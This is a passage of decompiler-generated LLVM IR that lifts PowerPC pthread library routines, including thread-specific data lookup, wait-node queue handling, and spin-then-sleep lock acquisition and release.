  %v1_10017ea8 = mul i32 %v0_10017ea8, 4
  store i32 %v1_10017ea8, i32* @r10, align 4
  %v1_10017eb0 = add i32 %v0_10017ea8, 1
  store i32 %v1_10017eb0, i32* %r30.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10017ea8, 32
  br i1 %tmp20, label %dec_label_pc_10017e54, label %dec_label_pc_10017eb8.loopexit

dec_label_pc_10017eb8.loopexit:                   ; preds = %dec_label_pc_10017e88
  br label %dec_label_pc_10017eb8

dec_label_pc_10017eb8:                            ; preds = %dec_label_pc_10017eb8.loopexit, %dec_label_pc_10017e38
  %v0_10017ec8.pr = phi i32 [ %v0_10017ec8.pr16, %dec_label_pc_10017e38 ], [ %v0_10017ec8.pr14.ph, %dec_label_pc_10017eb8.loopexit ]
  %v0_10017eb8 = phi i32 [ %v0_10017e38, %dec_label_pc_10017e38 ], [ %v0_10017ea4.ph, %dec_label_pc_10017eb8.loopexit ]
  %v1_10017e404 = phi i32 [ %v1_10017e40, %dec_label_pc_10017e38 ], [ %v1_10017eac.ph, %dec_label_pc_10017eb8.loopexit ]
  %v1_10017eb8 = add i32 %v0_10017eb8, 1
  store i32 %v1_10017eb8, i32* %r31.global-to-local, align 4
  %tmp21 = icmp slt i32 %v1_10017eb8, 32
  br i1 %tmp21, label %dec_label_pc_10017e38, label %dec_label_pc_10017ec4

dec_label_pc_10017ec4:                            ; preds = %dec_label_pc_10017eb8
  %v0_10017ec4 = load i32, i32* %r28.global-to-local, align 4
  %v1_10017ec4 = add i32 %v0_10017ec4, 1
  store i32 %v1_10017ec4, i32* %r28.global-to-local, align 4
  %v3_10017ec8 = icmp eq i32 %v0_10017ec8.pr, 0
  br i1 %v3_10017ec8, label %dec_label_pc_10017ee4, label %dec_label_pc_10017ed0

dec_label_pc_10017ed0:                            ; preds = %entry, %dec_label_pc_10017ec4
  %v1_10017e403 = phi i32 [ %v0_10017e28, %entry ], [ %v1_10017e404, %dec_label_pc_10017ec4 ]
  %v0_10017ed0 = phi i32 [ 0, %entry ], [ %v1_10017ec4, %dec_label_pc_10017ec4 ]
  %v2_10017ed0 = icmp sgt i32 %v0_10017ed0, 3
  br i1 %v2_10017ed0, label %dec_label_pc_10017ee4, label %dec_label_pc_10017ed8

dec_label_pc_10017ed8:                            ; preds = %dec_label_pc_10017ed0
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10017e38

dec_label_pc_10017ee4:                            ; preds = %dec_label_pc_10017ed0, %dec_label_pc_10017ec4
  %v0_10017ee4 = phi i32 [ %v1_10017e403, %dec_label_pc_10017ed0 ], [ %v1_10017e404, %dec_label_pc_10017ec4 ]
  %v1_10017ee4 = add i32 %v0_10017ee4, 28
  %v2_10017ee4 = inttoptr i32 %v1_10017ee4 to i32*
  %v3_10017ee4 = load i32, i32* %v2_10017ee4, align 4
  store i32 %v3_10017ee4, i32* @r3, align 4
  store i32 %v0_10017ee4, i32* @r4, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017ef4.1113 to i32), i32* @lr, align 4
  %v0_10017ef0 = call i32 @__pthread_lock()
  br label %dec_label_pc_10017f14

dec_label_pc_10017ef8:                            ; preds = %dec_label_pc_10017f14
  %v1_10017ef8 = add i32 %v2_10017f1c, 236
  %v2_10017ef8 = inttoptr i32 %v1_10017ef8 to i32*
  %v3_10017ef8 = load i32, i32* %v2_10017ef8, align 4
  %v3_10017efc = icmp eq i32 %v3_10017ef8, 0
  store i32 %v3_10017ef8, i32* @r3, align 4
  br i1 %v3_10017efc, label %dec_label_pc_10017f14, label %dec_label_pc_10017f08

dec_label_pc_10017f08:                            ; preds = %dec_label_pc_10017ef8
  store i32 ptrtoint (i32* @global_var_10017f0c.1114 to i32), i32* @lr, align 4
  %v0_10017f08 = call i32 @free()
  %v1_10017f10 = load i32, i32* @r30, align 4
  %v2_10017f10 = add i32 %v1_10017f10, 12
  %v3_10017f10 = inttoptr i32 %v2_10017f10 to i32*
  store i32 0, i32* %v3_10017f10, align 4
  br label %dec_label_pc_10017f14

dec_label_pc_10017f14:                            ; preds = %dec_label_pc_10017ef8, %dec_label_pc_10017f08, %dec_label_pc_10017ee4
  %v0_10017f14 = load i32, i32* @r31, align 4
  %v1_10017f14 = mul i32 %v0_10017f14, 4
  %v1_10017f1c = load i32, i32* @r29, align 4
  %v2_10017f1c = add i32 %v1_10017f1c, %v1_10017f14
  %v1_10017f20 = add i32 %v0_10017f14, 1
  store i32 %v1_10017f20, i32* @r31, align 4
  %v1_10017f24 = add i32 %v2_10017f1c, 224
  store i32 %v1_10017f24, i32* @r30, align 4
  %tmp22 = icmp slt i32 %v0_10017f14, 32
  br i1 %tmp22, label %dec_label_pc_10017ef8, label %dec_label_pc_10017f2c

dec_label_pc_10017f2c:                            ; preds = %dec_label_pc_10017f14
  %v1_10017f2c = add i32 %v1_10017f1c, 28
  %v2_10017f2c = inttoptr i32 %v1_10017f2c to i32*
  %v3_10017f2c = load i32, i32* %v2_10017f2c, align 4
  store i32 %v3_10017f2c, i32* @r3, align 4
  store i32 268533556, i32* @lr, align 4
  %v0_10017f30 = call i32 @__pthread_unlock()
  ret i32 %v0_10017f30

; uselistorder directives
  uselistorder i32 %v2_10017f1c, { 1, 0 }
  uselistorder i32 %v0_10017f14, { 1, 2, 0 }
  uselistorder i32 %v0_10017ee4, { 1, 0 }
  uselistorder i32 %v1_10017eb8, { 1, 2, 0 }
  uselistorder i32 %v1_10017eb0, { 1, 0 }
  uselistorder i32 %v0_10017ea8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_10017ea4.ph, { 1, 0, 2 }
  uselistorder i32 %v0_10017e38, { 2, 1, 0 }
  uselistorder i32 %v1_10017e40, { 2, 0, 1 }
  uselistorder i32 %v0_10017ec8.pr16, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r28.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__pthread_unlock, { 8, 10, 9, 43, 42, 41, 40, 39, 38, 37, 46, 36, 34, 33, 35, 0, 32, 47, 31, 45, 30, 29, 28, 27, 26, 7, 6, 4, 3, 2, 1, 5, 25, 44, 12, 24, 23, 13, 11, 22, 21, 20, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 224, { 2, 0, 1 }
  uselistorder i32 ()* @__pthread_lock, { 6, 7, 29, 28, 27, 32, 25, 24, 26, 23, 22, 1, 0, 21, 33, 20, 31, 19, 18, 5, 3, 2, 4, 17, 30, 9, 16, 15, 10, 8, 14, 13, 12, 11 }
  uselistorder label %dec_label_pc_10017f14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10017e88.outer, { 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v2_10017f48 = icmp ugt i32 %arg1, 1023
  %v1_10017f4c = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  store i32 %v1_10017f4c, i32* %r0.global-to-local, align 4
  br i1 %v2_10017f48, label %dec_label_pc_10017f88, label %dec_label_pc_10017f58

dec_label_pc_10017f58:                            ; preds = %entry
  %v1_10017f50 = load i32, i32* @r2, align 4
  %v2_10017f50 = add i32 %v1_10017f50, %v1_10017f4c
  %v1_10017f58 = add i32 %v2_10017f50, 236
  %v2_10017f58 = inttoptr i32 %v1_10017f58 to i32*
  %v3_10017f58 = load i32, i32* %v2_10017f58, align 4
  store i32 %v3_10017f58, i32* %r11.global-to-local, align 4
  %v1_10017f5c = mul i32 %arg1, 8
  store i32 %v1_10017f5c, i32* %r0.global-to-local, align 4
  %v3_10017f60 = icmp eq i32 %v3_10017f58, 0
  br i1 %v3_10017f60, label %dec_label_pc_10017f88, label %dec_label_pc_10017f68

dec_label_pc_10017f68:                            ; preds = %dec_label_pc_10017f58
  %v1_10017f6c = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10017f74 = load i32, i32* %r0.global-to-local, align 4
  %v2_10017f74 = add i32 %v1_10017f74, ptrtoint (i32* @global_var_100497f4.1103 to i32)
  %v3_10017f74 = inttoptr i32 %v2_10017f74 to i32*
  %v4_10017f74 = load i32, i32* %v3_10017f74, align 4
  store i32 %v4_10017f74, i32* %r0.global-to-local, align 4
  %v3_10017f78 = icmp eq i32 %v4_10017f74, 0
  br i1 %v3_10017f78, label %dec_label_pc_10017f88, label %dec_label_pc_10017f80

dec_label_pc_10017f80:                            ; preds = %dec_label_pc_10017f68
  %v1_10017f80 = load i32, i32* %r11.global-to-local, align 4
  %v2_10017f80 = add i32 %v1_10017f80, %v1_10017f6c
  %v3_10017f80 = inttoptr i32 %v2_10017f80 to i32*
  %v4_10017f80 = load i32, i32* %v3_10017f80, align 4
  ret i32 %v4_10017f80

dec_label_pc_10017f88:                            ; preds = %dec_label_pc_10017f68, %dec_label_pc_10017f58, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_100497f4.1103 to i32), { 4, 1, 5, 6, 8, 0, 2, 3, 7 }
  uselistorder i32 236, { 2, 1, 5, 6, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
}

define i32 @wait_node_dequeue(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v4_10017f90 = icmp eq i32 %tmp, %arg1
  %v1_10017f98 = inttoptr i32 %arg3 to i32*
  br i1 %v4_10017f90, label %dec_label_pc_10017f9c, label %dec_label_pc_10017fd4

dec_label_pc_10017f9c:                            ; preds = %entry
  %r9.promoted = load i32, i32* @r9, align 4
  %v5_10017fa0 = icmp eq i32 %r9.promoted, %arg3
  %v0_10017fb8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v5_10017fa0, i32 %v0_10017fb8)
  %v0_10017fc81 = load i32, i32* %r4.global-to-local, align 4
  %v1_10017fc82 = inttoptr i32 %v0_10017fc81 to i32*
  %v2_10017fc83 = load i32, i32* %v1_10017fc82, align 4
  %v4_10017fcc6 = icmp eq i32 %v2_10017fc83, %arg3
  br i1 %v4_10017fcc6, label %dec_label_pc_10017fd4, label %dec_label_pc_10017fc0

dec_label_pc_10017fc0:                            ; preds = %dec_label_pc_10017f9c, %dec_label_pc_10017fc0
  %v0_10017fc0 = phi i32 [ %v2_10017fc8, %dec_label_pc_10017fc0 ], [ %v2_10017fc83, %dec_label_pc_10017f9c ]
  store i32 %v0_10017fc0, i32* %r4.global-to-local, align 4
  %v1_10017fc8 = inttoptr i32 %v0_10017fc0 to i32*
  %v2_10017fc8 = load i32, i32* %v1_10017fc8, align 4
  %v4_10017fcc = icmp eq i32 %v2_10017fc8, %arg3
  br i1 %v4_10017fcc, label %dec_label_pc_10017fc8.dec_label_pc_10017fd4.loopexit_crit_edge, label %dec_label_pc_10017fc0

dec_label_pc_10017fc8.dec_label_pc_10017fd4.loopexit_crit_edge: ; preds = %dec_label_pc_10017fc0
  br label %dec_label_pc_10017fd4

dec_label_pc_10017fd4:                            ; preds = %entry, %dec_label_pc_10017f9c, %dec_label_pc_10017fc8.dec_label_pc_10017fd4.loopexit_crit_edge
  %v1_10017fd8 = phi i32 [ %v0_10017fc0, %dec_label_pc_10017fc8.dec_label_pc_10017fd4.loopexit_crit_edge ], [ %v0_10017fc81, %dec_label_pc_10017f9c ], [ %tmp, %entry ]
  %v2_10017fd4 = load i32, i32* %v1_10017f98, align 4
  %v2_10017fd8 = inttoptr i32 %v1_10017fd8 to i32*
  store i32 %v2_10017fd4, i32* %v2_10017fd8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_10017fc8, { 1, 0 }
  uselistorder i32 %v0_10017fc0, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10017fd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017fc0, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10017fec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10017fec, i32* @r30, align 4
  store i32 0, i32* @r31, align 4
  %v2_1001800c = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_10018038

dec_label_pc_10018000:                            ; preds = %dec_label_pc_10018038
  %v2_10018054 = icmp sgt i32 %v0_10018054, 49
  %v1_10018004 = add i32 %v0_10018054, 1
  store i32 %v1_10018004, i32* @r31, align 4
  store i32 %v2_1001800c, i32* %r3.global-to-local, align 4
  br i1 %v2_10018054, label %dec_label_pc_10018020, label %dec_label_pc_10018018

dec_label_pc_10018018:                            ; preds = %dec_label_pc_10018000
  store i32 ptrtoint (i32* @global_var_1001801c.1115 to i32), i32* @lr, align 4
  %v2_10018018 = call i32 @sched_yield(i32 %v2_1001800c, i32 0)
  br label %dec_label_pc_10018030.backedge

dec_label_pc_10018020:                            ; preds = %dec_label_pc_10018000
  store i32 0, i32* %stack_var_-24, align 4
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10018030.1116 to i32), i32* @lr, align 4
  %v2_1001802c = call i32 @nanosleep(i32 %v2_1001800c, i32 0)
  br label %dec_label_pc_10018030.backedge

dec_label_pc_10018030.backedge:                   ; preds = %dec_label_pc_10018020, %dec_label_pc_10018018
  %storemerge = phi i32 [ %v2_10018018, %dec_label_pc_10018018 ], [ %v2_1001802c, %dec_label_pc_10018020 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_10018054.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018038

dec_label_pc_10018038:                            ; preds = %entry, %dec_label_pc_10018030.backedge
  %v0_10018054 = phi i32 [ %v0_10018054.pre, %dec_label_pc_10018030.backedge ], [ 0, %entry ]
  %v0_1001806c = phi i32 [ %storemerge, %dec_label_pc_10018030.backedge ], [ %v0_10017fec, %entry ]
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_1001803c = icmp eq i32 %r11.promoted, 0
  br i1 %v5_1001803c, label %dec_label_pc_1001805c, label %dec_label_pc_10018000

dec_label_pc_1001805c:                            ; preds = %dec_label_pc_10018038
  ret i32 %v0_1001806c

; uselistorder directives
  uselistorder i32 %v2_1001800c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 49, { 1, 0 }
  uselistorder label %dec_label_pc_10018038, { 1, 0 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 268697600, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268533904, i32* @lr, align 4
  %v1_1001808c = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_10045208.1117 to i32))
  store i32 268697600, i32* @r9, align 4
  %v3_10018094 = load i32, i32* @global_var_10045204.1118, align 4
  %v1_10018098 = load i32, i32* @r28, align 4
  %v2_10018098 = inttoptr i32 %v1_10018098 to i32*
  store i32 %v3_10018094, i32* %v2_10018098, align 4
  %v0_1001809c = load i32, i32* @r28, align 4
  store i32 %v0_1001809c, i32* @global_var_10045204.1118, align 4
  store i32 0, i32* @global_var_10045208.1117, align 4
  ret i32 %v1_1001808c
}

define i32 @restart.9(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268533972, i32* @lr, align 4
  %v0_100180d0 = call i32 @__pthread_restart_new()
  ret i32 %v0_100180d0

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 0, 5, 4, 1, 2, 3 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100180e8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_100180fc.outer

dec_label_pc_100180fc.outer:                      ; preds = %dec_label_pc_100181c4, %dec_label_pc_100181b0, %entry
  %v0_100181a87.ph = phi i32 [ %tmp, %entry ], [ %v0_100181a8, %dec_label_pc_100181b0 ], [ %v0_100181a8, %dec_label_pc_100181c4 ]
  %v1_100180fc = inttoptr i32 %v0_100181a87.ph to i32*
  br label %dec_label_pc_100180fc

dec_label_pc_100180fc:                            ; preds = %dec_label_pc_100180fc.outer, %dec_label_pc_10018110
  %v2_100180fc = load i32, i32* %v1_100180fc, align 4
  %v2_10018100 = icmp ugt i32 %v2_100180fc, 1
  br i1 %v2_10018100, label %dec_label_pc_1001814c.lr.ph, label %dec_label_pc_10018110

dec_label_pc_10018110:                            ; preds = %dec_label_pc_100180fc
  %r9.promoted = load i32, i32* @r9, align 4
  %.pre = xor i32 %r9.promoted, %v2_100180fc
  %v5_10018114 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r9, align 4
  br i1 %v5_10018114, label %dec_label_pc_10018208.loopexit, label %dec_label_pc_100180fc

dec_label_pc_1001814c.lr.ph:                      ; preds = %dec_label_pc_100180fc
  store i32 %v2_100180fc, i32* @r31, align 4
  store i32 -2147483648, i32* @r27, align 4
  store i32 %v2_100180fc, i32* @r28, align 4
  store i32 %v0_100181a87.ph, i32* @r26, align 4
  br label %dec_label_pc_1001814c

dec_label_pc_1001814c:                            ; preds = %dec_label_pc_1001814c.lr.ph, %dec_label_pc_1001819c.backedge
  %v0_1001818c = phi i32 [ %v0_100181a87.ph, %dec_label_pc_1001814c.lr.ph ], [ %v0_100181a4, %dec_label_pc_1001819c.backedge ]
  %v0_100181a811 = phi i32 [ %v0_100181a87.ph, %dec_label_pc_1001814c.lr.ph ], [ %v0_100181a8, %dec_label_pc_1001819c.backedge ]
  %v0_10018194 = phi i32 [ %v2_100180fc, %dec_label_pc_1001814c.lr.ph ], [ %v0_100181a0, %dec_label_pc_1001819c.backedge ]
  %v1_1001814c = add i32 %v0_10018194, 8
  %v2_1001814c = inttoptr i32 %v1_1001814c to i32*
  %v3_1001814c = load i32, i32* %v2_1001814c, align 4
  %v3_10018150 = icmp eq i32 %v3_1001814c, 0
  br i1 %v3_10018150, label %dec_label_pc_10018178, label %dec_label_pc_10018158

dec_label_pc_10018158:                            ; preds = %dec_label_pc_1001814c
  store i32 268534108, i32* @lr, align 4
  %v3_10018158 = inttoptr i32 %v0_1001818c to i32*
  %v4_10018158 = call i32 @wait_node_dequeue(i32 %v0_100181a811, i32* %v3_10018158, i32 %v0_10018194)
  %v0_1001815c = load i32, i32* @r31, align 4
  store i32 268534116, i32* @lr, align 4
  %v1_10018160 = inttoptr i32 %v0_1001815c to i32*
  %v2_10018160 = call i32 @wait_node_free(i32* %v1_10018160)
  %v0_10018164 = load i32, i32* @r29, align 4
  %v1_10018164 = inttoptr i32 %v0_10018164 to i32*
  %v2_10018164 = load i32, i32* %v1_10018164, align 4
  store i32 %v2_10018164, i32* @r31, align 4
  %v1_10018168 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001819c.backedge

dec_label_pc_10018178:                            ; preds = %dec_label_pc_1001814c
  %v1_10018178 = add i32 %v0_10018194, 4
  %v2_10018178 = inttoptr i32 %v1_10018178 to i32*
  %v3_10018178 = load i32, i32* %v2_10018178, align 4
  store i32 %v3_10018178, i32* @r9, align 4
  %v1_1001817c = add i32 %v3_10018178, 24
  %v2_1001817c = inttoptr i32 %v1_1001817c to i32*
  %v3_1001817c = load i32, i32* %v2_1001817c, align 4
  %v1_10018180 = load i32, i32* @r27, align 4
  %v2_10018180 = icmp slt i32 %v3_1001817c, %v1_10018180
  br i1 %v2_10018180, label %dec_label_pc_10018194, label %dec_label_pc_10018188

dec_label_pc_10018188:                            ; preds = %dec_label_pc_10018178
  store i32 %v3_1001817c, i32* @r27, align 4
  store i32 %v0_1001818c, i32* @r26, align 4
  store i32 %v0_10018194, i32* @r28, align 4
  br label %dec_label_pc_10018194

dec_label_pc_10018194:                            ; preds = %dec_label_pc_10018178, %dec_label_pc_10018188
  store i32 %v0_10018194, i32* @r29, align 4
  %v1_10018198 = inttoptr i32 %v0_10018194 to i32*
  %v2_10018198 = load i32, i32* %v1_10018198, align 4
  store i32 %v2_10018198, i32* @r31, align 4
  br label %dec_label_pc_1001819c.backedge

dec_label_pc_1001819c.backedge:                   ; preds = %dec_label_pc_10018194, %dec_label_pc_10018158
  %v0_100181a8 = phi i32 [ %v0_100181a811, %dec_label_pc_10018194 ], [ %v1_10018168, %dec_label_pc_10018158 ]
  %v0_100181a4 = phi i32 [ %v0_10018194, %dec_label_pc_10018194 ], [ %v0_10018164, %dec_label_pc_10018158 ]
  %v0_100181a0 = phi i32 [ %v2_10018198, %dec_label_pc_10018194 ], [ %v2_10018164, %dec_label_pc_10018158 ]
  %v3_1001819c = icmp eq i32 %v0_100181a0, 1
  br i1 %v3_1001819c, label %dec_label_pc_100181b0, label %dec_label_pc_1001814c

dec_label_pc_100181b0:                            ; preds = %dec_label_pc_1001819c.backedge
  %v0_100181b4.pre = load i32, i32* @r27, align 4
  %v4_100181b4 = icmp eq i32 %v0_100181b4.pre, -2147483648
  br i1 %v4_100181b4, label %dec_label_pc_100180fc.outer, label %dec_label_pc_100181c4

dec_label_pc_100181c4:                            ; preds = %dec_label_pc_100181b0
  %v0_100181bc = load i32, i32* @r28, align 4
  %v1_100181bc = add i32 %v0_100181bc, 8
  store i32 %v1_100181bc, i32* @r9, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_100181c8 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_100181c8, label %dec_label_pc_100181e4, label %dec_label_pc_100180fc.outer

dec_label_pc_100181e4:                            ; preds = %dec_label_pc_100181c4
  %v0_100181e4 = load i32, i32* @r26, align 4
  store i32 268534256, i32* @lr, align 4
  %v3_100181ec = inttoptr i32 %v0_100181bc to i32*
  %v4_100181ec = call i32 @wait_node_dequeue(i32 %v0_100181e4, i32* %v3_100181ec, i32 %v0_100181bc)
  %v0_100181f0 = load i32, i32* @r28, align 4
  %v1_100181f0 = add i32 %v0_100181f0, 4
  %v2_100181f0 = inttoptr i32 %v1_100181f0 to i32*
  %v3_100181f0 = load i32, i32* %v2_100181f0, align 4
  store i32 %v3_100181f0, i32* @r3, align 4
  store i32 %v0_100180e8, i32* @lr, align 4
  %v1_10018204 = call i32 @restart.9(i32 %v3_100181f0)
  br label %dec_label_pc_10018208

dec_label_pc_10018208.loopexit:                   ; preds = %dec_label_pc_10018110
  br label %dec_label_pc_10018208

dec_label_pc_10018208:                            ; preds = %dec_label_pc_10018208.loopexit, %dec_label_pc_100181e4
  %v0_10018218 = phi i32 [ %v1_10018204, %dec_label_pc_100181e4 ], [ %v2_100180fc, %dec_label_pc_10018208.loopexit ]
  ret i32 %v0_10018218

; uselistorder directives
  uselistorder i32 %v0_100181bc, { 1, 0, 2 }
  uselistorder i32 %v0_100181a0, { 1, 0 }
  uselistorder i32 %v0_100181a8, { 1, 0, 2 }
  uselistorder i32 %v0_10018194, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_100180fc, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v0_100181a87.ph, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10018194, { 1, 0 }
  uselistorder label %dec_label_pc_1001814c, { 1, 0 }
  uselistorder label %dec_label_pc_100180fc, { 1, 0 }
}

define i32 @suspend.10() local_unnamed_addr {
entry:
  store i32 268534316, i32* @lr, align 4
  %v0_10018228 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10018228

; uselistorder directives
  uselistorder i32 ()* @__pthread_wait_for_restart_signal, { 0, 4, 5, 1, 2, 3, 6 }
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r11, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* @r3, align 4
  br label %dec_label_pc_10018254

dec_label_pc_10018254:                            ; preds = %dec_label_pc_10018298, %entry
  %v0_10018258 = phi i32 [ %v0_100182584, %dec_label_pc_10018298 ], [ %arg2, %entry ]
  %v2_10018254 = load i32, i32* %arg1, align 4
  store i32 %v2_10018254, i32* @r9, align 4
  %v3_10018260 = icmp eq i32 %v2_10018254, 0
  br i1 %v3_10018260, label %dec_label_pc_10018284, label %dec_label_pc_10018268

dec_label_pc_10018268:                            ; preds = %dec_label_pc_10018254
  %v3_10018258 = icmp eq i32 %v0_10018258, 0
  br i1 %v3_10018258, label %dec_label_pc_1001826c, label %dec_label_pc_10018270

dec_label_pc_1001826c:                            ; preds = %dec_label_pc_10018268
  %v0_1001826c = load i32, i32* @r2, align 4
  store i32 %v0_1001826c, i32* @r3, align 4
  br label %dec_label_pc_10018270

dec_label_pc_10018270:                            ; preds = %dec_label_pc_10018268, %dec_label_pc_1001826c
  %v0_100182583 = phi i32 [ %v0_10018258, %dec_label_pc_10018268 ], [ %v0_1001826c, %dec_label_pc_1001826c ]
  br label %dec_label_pc_10018284

dec_label_pc_10018284:                            ; preds = %dec_label_pc_10018270, %dec_label_pc_10018254
  %v0_100182584 = phi i32 [ %v0_10018258, %dec_label_pc_10018254 ], [ %v0_100182583, %dec_label_pc_10018270 ]
  %r8.promoted = load i32, i32* @r8, align 4
  %.pre = xor i32 %r8.promoted, %v2_10018254
  %v5_10018288 = icmp eq i32 %.pre, 0
  br i1 %v5_10018288, label %dec_label_pc_100182a4, label %dec_label_pc_10018298

dec_label_pc_10018298:                            ; preds = %dec_label_pc_10018284
  store i32 %.pre, i32* @r8, align 4
  br label %dec_label_pc_10018254

dec_label_pc_100182a4:                            ; preds = %dec_label_pc_10018284
  store i32 0, i32* @r8, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10018260, label %dec_label_pc_100182b0, label %dec_label_pc_100182ac

dec_label_pc_100182ac:                            ; preds = %dec_label_pc_100182a4
  store i32 ptrtoint (i32* @global_var_100182b0.1119 to i32), i32* @lr, align 4
  %v0_100182ac = call i32 @suspend.10()
  br label %dec_label_pc_100182b0

dec_label_pc_100182b0:                            ; preds = %dec_label_pc_100182a4, %dec_label_pc_100182ac
  %v0_100182c0 = phi i32 [ %v0_100182584, %dec_label_pc_100182a4 ], [ %v0_100182ac, %dec_label_pc_100182ac ]
  ret i32 %v0_100182c0

; uselistorder directives
  uselistorder i32 %v0_10018258, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100182b0, { 1, 0 }
  uselistorder label %dec_label_pc_10018270, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100182c8 = load i32, i32* @lr, align 4
  store i32 %v0_100182c8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268534508, i32* @lr, align 4
  %v1_100182e8 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_10045208.1117 to i32))
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v3_100182f4 = load i32, i32* @global_var_10045204.1118, align 4
  store i32 %v3_100182f4, i32* %r0.global-to-local, align 4
  %v3_100182f8 = icmp eq i32 %v3_100182f4, 0
  br i1 %v3_100182f8, label %dec_label_pc_1001830c, label %dec_label_pc_10018300

dec_label_pc_10018300:                            ; preds = %entry
  store i32 %v3_100182f4, i32* @r31, align 4
  %v1_10018304 = inttoptr i32 %v3_100182f4 to i32*
  %v2_10018304 = load i32, i32* %v1_10018304, align 4
  store i32 %v2_10018304, i32* %r0.global-to-local, align 4
  store i32 %v2_10018304, i32* @global_var_10045204.1118, align 4
  br label %dec_label_pc_1001830c

dec_label_pc_1001830c:                            ; preds = %entry, %dec_label_pc_10018300
  %v0_10018334.pr = phi i1 [ false, %dec_label_pc_10018300 ], [ true, %entry ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_10045208.1117, align 4
  br i1 %v0_10018334.pr, label %dec_label_pc_10018334, label %dec_label_pc_10018334.thread

dec_label_pc_10018334.thread:                     ; preds = %dec_label_pc_1001830c
  br label %dec_label_pc_1001834c

dec_label_pc_10018334:                            ; preds = %dec_label_pc_1001830c
  store i32 12, i32* @r3, align 4
  store i32 268534576, i32* @lr, align 4
  %v0_1001832c = call i32 @malloc()
  store i32 %v0_1001832c, i32* @r31, align 4
  %v3_10018334 = icmp eq i32 %v0_1001832c, 0
  br i1 %v3_10018334, label %dec_label_pc_1001833c, label %dec_label_pc_1001834c

dec_label_pc_1001833c:                            ; preds = %dec_label_pc_10018334
  %v0_1001833c = load i32, i32* @r29, align 4
  %v0_10018340 = load i32, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10018348.1120 to i32), i32* @lr, align 4
  %v2_10018344 = inttoptr i32 %v0_1001833c to i32*
  %v3_10018344 = call i32 @__pthread_alt_lock(i32* %v2_10018344, i32 %v0_10018340)
  br label %dec_label_pc_100183fc

